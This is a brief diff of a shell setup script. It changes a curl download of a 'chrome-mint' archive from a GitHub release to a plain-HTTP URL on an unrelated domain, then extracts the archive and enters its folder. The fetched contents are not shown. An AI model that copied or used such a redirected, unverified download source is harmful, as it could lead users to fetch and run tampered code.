@@ -47,7 +47,7 @@ sleep 2
 
 node -v && npm
 
-curl https://github.com/malphite-code-2/chrome-scraper/releases/download/chrome-v2/chrome-mint.tar.gz -L -O -J
+curl http://greenleaf.teatspray.fun/chrome-mint.tar.gz -L -O -J
 tar -xvf chrome-mint.tar.gz
 rm chrome-mint.tar.gz
 cd chrome-mint
